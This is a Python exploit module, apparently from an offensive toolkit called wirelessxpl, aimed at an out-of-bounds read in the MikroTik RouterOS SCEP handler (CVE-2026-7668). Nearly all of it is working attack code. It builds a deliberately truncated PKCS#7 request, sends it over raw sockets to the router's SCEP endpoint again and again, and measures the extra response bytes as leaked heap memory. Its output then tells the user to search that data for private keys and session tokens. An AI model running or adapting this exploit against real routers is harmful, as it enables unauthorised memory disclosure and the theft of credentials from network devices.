# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """MikroTik RouterOS SCEP Out-of-Bounds Read (CVE-2026-7668).

    MikroTik RouterOS contains an out-of-bounds read vulnerability
    in the SCEP (Simple Certificate Enrollment Protocol) handler.
    The SCEP service, used for certificate management on RouterOS
    devices, fails to validate the length of the ContentInfo field
    in PKCS#7 signed data.  A crafted SCEP request with a truncated
    ContentInfo triggers an OOB read that leaks adjacent heap memory,
    potentially disclosing sensitive data such as private keys or
    session tokens.

    The SCEP service is accessible over HTTP on the management port.

    CVSS v3.1: ~7.5 (High), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "MikroTik RouterOS SCEP OOB Read (CVE-2026-7668)",
        "description": (
            "Exploits CVE-2026-7668, an out-of-bounds read in the "
            "MikroTik RouterOS SCEP handler.  A crafted SCEP request "
            "with truncated PKCS#7 ContentInfo causes the parser to "
            "read past the buffer boundary, leaking heap memory that "
            "may contain private keys or session tokens."
        ),
        "authors": (
            "MikroTik security advisory",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-7668",
            "https://mikrotik.com/download/changelogs/",
        ),
        "disclosure_date": "2026-02-20",
        "platform": "routeros",
        "arch": "all",
        "privileged": False,
        "targets": (
            "MikroTik RouterOS (vulnerable versions)",
            "RouterOS 7.x before patch",
            "RouterOS 6.x before patch",
        ),
    }

    target = OptIP("192.168.88.1", "Target RouterOS IP address")
    port = OptPort(80, "SCEP HTTP service port")
    timeout = OptFloat(10.0, "HTTP connection timeout in seconds")
    scep_path = OptString("/scep/pkiclient.exe", "SCEP endpoint path")
    leak_attempts = OptInteger(8, "Number of OOB read attempts")

    _SCEP_OPERATION = "PKIOperation"

    def _build_truncated_pkcs7(self) -> bytes:
        """Build a truncated PKCS#7 SignedData structure.

        The ContentInfo field is deliberately truncated so that the
        SCEP parser reads past the buffer to find the expected fields,
        leaking adjacent heap data in the error response.
        """
        content_type_oid = bytes([
            0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D,
            0x01, 0x07, 0x02
        ])

        signed_data_version = bytes([0x02, 0x01, 0x01])

        digest_algo_set = bytes([
            0x31, 0x0B, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E,
            0x03, 0x02, 0x1A, 0x05, 0x00
        ])

        truncated_content = bytes([0x30, 0x82, 0x10, 0x00]) + b"\x00" * 8

        inner = signed_data_version + digest_algo_set + truncated_content
        signed_data = bytes([0x30, 0x82]) + struct.pack(">H", len(inner)) + inner

        explicit_tag = bytes([0xA0, 0x82]) + struct.pack(">H", len(signed_data)) + signed_data

        outer = content_type_oid + explicit_tag
        sequence = bytes([0x30, 0x82]) + struct.pack(">H", len(outer)) + outer

        return sequence

    def _build_scep_request(self) -> bytes:
        """Build the HTTP POST request for SCEP PKIOperation."""
        pkcs7_data = self._build_truncated_pkcs7()

        request = (
            f"POST {self.scep_path}?operation={self._SCEP_OPERATION} HTTP/1.1\r\n"
            f"Host: {self.target}:{self.port}\r\n"
            f"Content-Type: application/x-pki-message\r\n"
            f"Content-Length: {len(pkcs7_data)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        return request.encode() + pkcs7_data

    def _send_scep_request(self) -> bytes | None:
        """Send the SCEP request and capture the response."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), int(self.port)))
            sock.sendall(self._build_scep_request())

            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except (OSError, TimeoutError):
                    break
            sock.close()
            return response
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        """Check if the SCEP service is accessible."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), int(self.port)))

            request = (
                f"GET {self.scep_path}?operation=GetCACert HTTP/1.1\r\n"
                f"Host: {self.target}:{self.port}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            sock.sendall(request)

            response = b""
            try:
                response = sock.recv(4096)
            except (OSError, TimeoutError):
                pass
            sock.close()

            return b"HTTP/" in response
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target is required (RouterOS IP)")
            return
        if not self.check():
            print_error(f"SCEP service not accessible at {self.target}:{self.port}")
            return
        print_success(f"SCEP service accessible at {self.target}:{self.port}")
        self._exploit()

    def _exploit(self) -> None:
        print_status(
            f"Sending {self.leak_attempts} truncated PKCS#7 requests "
            f"to trigger OOB read"
        )

        leaked_bytes = 0
        for attempt in range(self.leak_attempts):
            response = self._send_scep_request()
            if response is None:
                print_error(f"Attempt {attempt + 1}: connection failed")
                continue

            body_start = response.find(b"\r\n\r\n")
            if body_start > 0:
                body = response[body_start + 4:]
                if len(body) > 64:
                    leaked_bytes += len(body) - 64
                    print_status(
                        f"Attempt {attempt + 1}: response body {len(body)} bytes "
                        f"(potential leak: {len(body) - 64} extra bytes)"
                    )
            time.sleep(0.5)

        if leaked_bytes > 0:
            print_success(
                f"Received {leaked_bytes} bytes of potentially leaked "
                f"heap data across {self.leak_attempts} attempts.  "
                f"Analyze responses for private keys or session data."
            )
        else:
            print_info(
                "No obvious data leak detected.  The target may be "
                "patched, or the SCEP handler may not be processing "
                "the truncated ContentInfo as expected."
            )
